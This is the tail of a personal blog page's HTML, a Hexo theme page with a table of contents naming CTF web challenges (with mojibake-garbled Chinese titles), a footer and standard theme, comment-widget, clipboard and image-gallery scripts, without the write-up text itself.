  <section class="widget toc-wrapper shadow desktop mobile">
    
  <header>
    
      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>æœ¬æ–‡ç›®å½•</span>
    
  </header>


    <div class='content'>
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#admin"><span class="toc-text">admin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CV-Maker"><span class="toc-text">CV Maker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyweb"><span class="toc-text">easyweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#æœ´å®æ— å"><span class="toc-text">æœ´å®æ— å</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#é¢œå€¼æˆç»©æŸ¥è¯¢"><span class="toc-text">é¢œå€¼æˆç»©æŸ¥è¯¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Train-Yourself-To-Be-Godly"><span class="toc-text">Train Yourself To Be Godly</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezbypass"><span class="toc-text">ezbypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ä½ ä¼ ä½ ğŸå‘¢"><span class="toc-text">ä½ ä¼ ä½ ğŸå‘¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PYwebsite"><span class="toc-text">PYwebsite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#å¥—å¨ƒ"><span class="toc-text">å¥—å¨ƒ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ezpop"><span class="toc-text">Ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ezaudit"><span class="toc-text">Ezaudit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ezpop-revenge"><span class="toc-text">Ezpop_revenge</span></a></li></ol>
    </div>
  </section>


  


</aside>


  
  <footer class="clearfix">
    <br><br>
    
      
        <div class="aplayer-container">
          


        </div>
      
    
      
        <br>
        <div class="social-wrapper">
          
            
              <a href="/atom.xml"
                class="social fas fa-rss flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
              </a>
            
          
            
              <a href="mailto:895531613@qq.com"
                class="social fas fa-envelope flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
              </a>
            
          
            
              <a href="https://github.com/baiyecha404"
                class="social fab fa-github flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
              </a>
            
          
        </div>
      
    
      
        <div class='copyright'>
        <p><a href="bycsec.top">Copyright Â© 2020 byc_404</a></p>

        </div>
      
    
      
        <a href="https://bycsec.top/" target="_blank" class="codename">IGNITE</a>
        ï¼Œæ€»è®¿é—®é‡ä¸º
          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
          æ¬¡
        
      
    
  </footer>

<script>setLoadingBarProgress(80);</script>


      <script>setLoadingBarProgress(60);</script>
    </div>
    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
  </div>
  
<script src="https://cdn.jsdelivr.net/npm/jquery@3.4/dist/jquery.min.js"></script>


  <script>
    
    var SEARCH_SERVICE = "hexo" || "hexo";
    var ROOT = "/" || "/";
    if (!ROOT.endsWith('/')) ROOT += '/';
  </script>


  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>


  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
  <script type="text/javascript">
    $(function() {
      ScrollReveal().reveal('.l_main .reveal', {
        distance: '8px',
        duration: '800',
        interval: '100',
        scale: '1'
      });
    });
  </script>


  
<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>

  <script type="text/javascript">
    $(function() {
      Waves.attach('.flat-btn', ['waves-button']);
      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
      Waves.attach('.flat-box', ['waves-block']);
      Waves.attach('.float-box', ['waves-block', 'waves-float']);
      Waves.attach('.waves-image');
      Waves.init();
    });
  </script>


  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>



  
  
  
    
<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>

    <script type="text/javascript">
      $(function(){
        var imgs=["https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/BBC19066-E176-47C2-9D22-48C81EE5DF6B.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B18FCBB3-67FD-48CC-B4F3-457BA145F17A.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/00E0F0ED-9F1C-407A-9AA6-545649D919F4.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/67239FBB-E15D-4F4F-8EE8-0F1C9F3C4E7C.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B951AE18-D431-417F-B3FE-A382403FF21B.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/2884F904-F1F3-479E-AE27-5EBC291B63B0.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/landscape/250662D4-5A21-4AAA-BB63-CD25CF97CFF1.jpeg"];
        if ('true' == 'true') {
          function shuffle(arr){
            /*From countercurrent-time*/
            var n = arr.length;
            while(n--) {
              var index = Math.floor(Math.random() * n);
              var temp = arr[index];
              arr[index] = arr[n];
              arr[n] = temp;
            }
          }
          shuffle(imgs);
        }
        if ('') {
          $('').backstretch(
            imgs,
          {
            duration: "20000",
            fade: "1500"
          });
        } else {
          $.backstretch(
            imgs,
          {
            duration: "20000",
            fade: "1500"
          });
        }
      });
    </script>
  











  
    
<script src="https://cdn.jsdelivr.net/npm/valine@1.4/dist/Valine.min.js"></script>

  
  <script>
  var GUEST_INFO = ['nick','mail','link'];
  var meta = 'nick,mail,link'.split(',').filter(function(item){
    return GUEST_INFO.indexOf(item) > -1
  });
  var REQUIRED_FIELDS = ['nick','mail','link'];
  var requiredFields = 'nick,mail'.split(',').filter(function(item){
    return REQUIRED_FIELDS.indexOf(item) > -1
  });
  var valine = new Valine();
  function emoji(path, idx, ext) {
      return path + "/" + path + "-" + idx + "." + ext;
  }
  var emojiMaps = {};
  for (var i = 1; i <= 54; i++) {
    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
  }
  for (var i = 1; i <= 101; i++) {
    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
  }
  for (var i = 1; i <= 116; i++) {
    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
  }
  for (var i = 1; i <= 125; i++) {
    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
  }
  for (var i = 1; i <= 4; i++) {
    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
  }
  valine.init({
    el: '#valine_container',
    meta: meta,
    
    appId: "pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz",
    appKey: "9HlyBGu0qm9EmkSNKD2qoBx4",
    placeholder: "å¿«æ¥è¯„è®ºå§~",
    pageSize:'10',
    avatar:'robohash',
    lang:'zh-cn',
    visitor: 'true',
    highlight: 'true',
    mathJax: 'false',
    enableQQ: 'true',
    requiredFields: requiredFields,
    emojiCDN: 'https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/emoji/valine/',
    emojiMaps: emojiMaps
  })
  </script>





  
<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/app.js"></script>



  
<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js"></script>



  
<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/comment_typing.js"></script>






<!-- å¤åˆ¶ -->

  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('fa-copy');
        $icon.addClass('fa-check-circle');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // ç­‰å¾…ä¸¤ç§’é’Ÿåæ¢å¤
          $icon.removeClass('fa-check-circle');
          $icon.addClass('fa-copy');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('fa-copy');
        $icon.addClass('fa-times-circle');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // ç­‰å¾…ä¸¤ç§’é’Ÿåæ¢å¤
          $icon.removeClass('fa-times-circle');
          $icon.addClass('fa-copy');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>




<!-- fancybox -->

  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
<script>
  let LAZY_LOAD_IMAGE = "";
  $(".article-entry").find("div.fancybox").find("img").each(function () {
      var element = document.createElement("a");
      $(element).attr("data-fancybox", "gallery");
      $(element).attr("href", $(this).attr("src"));
      /* å›¾ç‰‡é‡‡ç”¨æ‡’åŠ è½½å¤„ç†æ—¶,
       * ä¸€èˆ¬å›¾ç‰‡æ ‡ç­¾å†…ä¼šæœ‰ä¸ªå±æ€§åæ¥å­˜æ”¾å›¾ç‰‡çš„çœŸå®åœ°å€ï¼Œæ¯”å¦‚ data-original,
       * é‚£ä¹ˆæ­¤å¤„å°†åŸæœ¬çš„å±æ€§åsrcæ›¿æ¢ä¸ºå¯¹åº”å±æ€§ådata-original,
       * ä¿®æ”¹å¦‚ä¸‹
       */
       if (LAZY_LOAD_IMAGE) {
         $(element).attr("href", $(this).attr("data-original"));
       }
      $(this).wrap(element);
  });
</script>






  <script>setLoadingBarProgress(100);</script>
</body>
</html>
